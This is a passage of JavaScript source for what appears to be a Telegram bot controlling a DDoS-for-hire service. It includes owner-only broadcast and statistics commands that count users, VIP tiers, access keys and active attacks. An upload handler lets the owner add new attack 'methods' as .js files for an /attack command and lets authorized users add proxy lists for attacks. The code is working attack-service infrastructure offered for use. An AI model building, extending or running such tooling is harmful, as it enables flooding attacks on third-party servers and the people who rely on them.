});

// /broadcast
commands.set('/broadcast', async (msg) => {
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(msg.chat.id, '⛔ Owner only', { parse_mode: 'Markdown' });
  }
  const args = msg.text.split(' ').slice(1);
  if (args.length === 0) {
    return bot.sendMessage(msg.chat.id, '❌ Usage: /broadcast <message>', { parse_mode: 'Markdown' });
  }
  const message = args.join(' ');
  const users = db.getAllUsers();
  let success = 0, fail = 0;
  for (const user of users) {
    try {
      await bot.sendMessage(user.id, `📢 *Broadcast from owner:*\n${message}`, { parse_mode: 'Markdown' });
      success++;
    } catch (err) {
      fail++;
    }
  }
  await bot.sendMessage(msg.chat.id, `✅ Broadcast sent to ${success} users, failed: ${fail}`, { parse_mode: 'Markdown' });
});

// /stats
commands.set('/stats', async (msg) => {
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(msg.chat.id, '⛔ Owner only', { parse_mode: 'Markdown' });
  }
  const users = db.getAllUsers();
  const attacks = attackManager.list();
  const keys = Object.keys(db.data.keys).length;
  const proxyCount = fsSync.existsSync(path.join(PROXY_DIR, DEFAULT_PROXY_FILE))
    ? (await fs.readFile(path.join(PROXY_DIR, DEFAULT_PROXY_FILE), 'utf8')).split('\n').filter(l => l.trim()).length
    : 0;
  const stats = 
    `📊 *Bot Statistics*\n\n` +
    `👥 Total users: ${users.length}\n` +
    `  - Normal: ${users.filter(u => u.role === 'normal').length}\n` +
    `  - VIP: ${users.filter(u => u.role === 'vip').length}\n` +
    `🔑 Active keys: ${keys}\n` +
    `🚀 Active attacks: ${attacks.length}\n` +
    `📦 Proxies: ${proxyCount}`;
  await bot.sendMessage(msg.chat.id, stats, { parse_mode: 'Markdown' });
});

// ---------- Document Handler (Unified) ----------
bot.on('document', async (msg) => {
  // Only allow authorized users
  if (!await requireAuth(msg)) return;

  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const document = msg.document;

  // CASE 1: Method upload (owner only, .js file)
  if (userId === OWNER_ID && (document.file_name.endsWith('.js') || document.mime_type === 'application/javascript' || document.mime_type === 'text/javascript')) {
    const baseName = path.basename(document.file_name, '.js');
    const safeBase = baseName.replace(/[^a-zA-Z0-9]/g, '_');
    const fileName = `method_${safeBase}.js`;
    const filePath = path.join(METHODS_DIR, fileName);
    const methodName = safeBase.toLowerCase();

    const allMethods = db.getAllMethods();
    if (allMethods[methodName]) {
      return bot.sendMessage(chatId, `❌ Method \`${methodName}\` already exists.`, { parse_mode: 'Markdown' });
    }

    try {
      const fileLink = await bot.getFileLink(document.file_id);
      const response = await axios({ url: fileLink, method: 'GET', responseType: 'stream' });
      const writer = fsSync.createWriteStream(filePath);
      response.data.pipe(writer);

      await new Promise((resolve, reject) => {
        writer.on('finish', resolve);
        writer.on('error', reject);
      });

      const content = await fs.readFile(filePath, 'utf8');
      if (content.trim().length === 0) {
        await fs.unlink(filePath);
        return bot.sendMessage(chatId, '❌ File is empty.');
      }

      db.addMethod(methodName, fileName);
      await bot.sendMessage(
        chatId,
        `✅ *Method added successfully!*\n` +
        `Name: \`${methodName}\`\n` +
        `File: \`${fileName}\`\n` +
        `You can now use it: \`/attack ${methodName} ...\`\n` +
        `If this method requires npm packages, run /installmethods.`, // <-- added note
        { parse_mode: 'Markdown' }
      );
    } catch (err) {
      console.error('Method upload error:', err);
      bot.sendMessage(chatId, `❌ Failed to save method: ${err.message}`);
      try { await fs.unlink(filePath); } catch {}
    }
    return;
  }

  // CASE 2: Proxy upload (any authorized user, .txt file)
  if (document.mime_type === 'text/plain' || document.file_name.endsWith('.txt')) {
    let nextNumber = 1;
    try {
      const files = await fs.readdir(PROXY_DIR);
      const proxyFiles = files.filter(f => /^proxy\d+\.txt$/.test(f));
      const numbers = proxyFiles.map(f => parseInt(f.match(/\d+/)[0], 10));
      if (numbers.length > 0) {
        nextNumber = Math.max(...numbers) + 1;
      }
    } catch (err) {
      console.error('Error scanning proxy files:', err);
      return bot.sendMessage(chatId, '❌ Error accessing file directory. Please try again.');
    }

    const fileName = `proxy${nextNumber}.txt`;
    const filePath = path.join(PROXY_DIR, fileName);

    try {
      const fileLink = await bot.getFileLink(document.file_id);
      const response = await axios({ url: fileLink, method: 'GET', responseType: 'stream' });
      const writer = fsSync.createWriteStream(filePath);
      response.data.pipe(writer);

      await new Promise((resolve, reject) => {
        writer.on('finish', resolve);
        writer.on('error', reject);
      });

      const content = await fs.readFile(filePath, 'utf8');
      const lines = content.split('\n').filter(l => l.trim()).length;
      if (lines === 0) {
        await fs.unlink(filePath);
        return bot.sendMessage(chatId, '❌ File is empty. Upload a file with proxies (one per line: ip:port).');
      }

      await bot.sendMessage(
        chatId,
        `✅ *Proxy file uploaded successfully!*\n` +
        `📁 Filename: \`${fileName}\`\n` +
        `📊 Proxies: ${lines}\n` +
        `You can now use it in attacks: \`/attack ... ${fileName}\``,
        { parse_mode: 'Markdown' }
      );
      console.log(`[UPLOAD] User ${userId} uploaded ${fileName} (${lines} proxies)`);
    } catch (err) {
      console.error(`[UPLOAD ERROR] User ${userId}:`, err.message);
      try { await fs.unlink(filePath); } catch {}
      bot.sendMessage(chatId, `❌ Failed to save file: ${err.message}`);
    }
    return;
  }

  bot.sendMessage(chatId, '❌ Unsupported file type. Please upload a `.txt` file for proxies or a `.js` file (owner only) for a new method.');
});

// ---------- Message handler for text commands ----------
bot.on('message', async (msg) => {
  if (!msg.text || !msg.text.startsWith('/')) return;
  const command = msg.text.split(' ')[0].toLowerCase();
  const handler = commands.get(command);
  if (handler) {
    try {
      await handler(msg);
    } catch (err) {
      console.error(`Error in ${command}:`, err);
      bot.sendMessage(msg.chat.id, '❌ An internal error occurred.').catch(() => {});
    }
  }
});

// ---------- Initialize ----------
(async () => {
  await db.load();
  console.log('🤖 Bot started');
})();
